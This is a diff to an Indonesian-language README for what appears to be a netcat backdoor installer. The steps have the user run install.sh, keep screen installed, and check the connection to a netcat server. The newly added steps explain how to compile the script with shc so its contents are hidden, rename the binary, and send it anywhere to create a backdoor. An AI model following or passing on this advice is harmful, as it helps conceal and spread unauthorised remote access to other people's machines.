@@ -17,3 +17,6 @@ all netcat for know os you know
 3. ikuti perintah yang di berikan (karena kadang disurub ulangi excute instaal.sh). 
 4. btw ini wajib ada screen yang terinstall, jika tidak terintsalal, maka install manual, `apt install screen -y`
 5. jika sudah muncul **DONE SEMPURNA** pastikan sudah konek dengan netcat server, jika belum coba restart OS linux tersebut, dan lihat kembali
+6. **(opsional)** Jika ingin agar file install.sh tidak dapat dilihat isnya, maka bisa dengan download install.sh dulu kemudian `shc -f script.sh` maka akan keluar dua file yang .x dan .c, untuk .x adalah binary yang dapat di excute langsung sedangakan .c adalah yang berubah  menjadi jadi bahasa C.
+7. ubah install.sh.x tadi menjadi install.sh atauoun lainnya, dan bisa kirim kemanapun untuk bikin backdoor.
+8. sekian
